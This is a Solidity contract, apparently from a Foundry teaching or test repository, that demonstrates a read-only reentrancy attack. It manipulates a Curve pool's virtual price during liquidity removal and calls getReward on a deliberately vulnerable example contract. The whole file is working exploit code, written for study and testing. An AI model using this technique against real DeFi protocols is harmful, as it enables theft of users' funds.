// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ReadOnlyReentranceVul} from "src/example/readOnlyVul.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint256);

    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount) external payable returns (uint256);

    function remove_liquidity(uint256 lp, uint256[2] calldata min_amounts) external returns (uint256[2] memory);
}

contract AttackReadOnlyVul {
    ICurve private constant pool = ICurve(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 public constant lpToken = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    ReadOnlyReentranceVul private immutable victim;

    constructor(address _victim) {
        victim = ReadOnlyReentranceVul(_victim);
    }

    receive() external payable {
        console2.log("during remove LP - virtual price", pool.get_virtual_price());
        // Attack - Log reward amount
        uint256 reward = victim.getReward();
        console2.log("reward", reward);
    }

    // Deposit into victim
    function setup() external payable {
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);

        lpToken.approve(address(victim), lp);
        victim.stake(lp);
    }

    function pwn() external payable {
        // Add liquidity
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        // Log get_virtual_price
        console2.log("before remove LP - virtual price", pool.get_virtual_price());
        // console.log("lp", lp);

        // remove liquidity
        uint256[2] memory min_amounts = [uint256(0), uint256(0)];
        pool.remove_liquidity(lp, min_amounts);

        // Log get_virtual_price
        console2.log("after remove LP - virtual price", pool.get_virtual_price());

        // Attack - Log reward amount
        uint256 reward = victim.getReward();
        console2.log("reward", reward);
    }
}
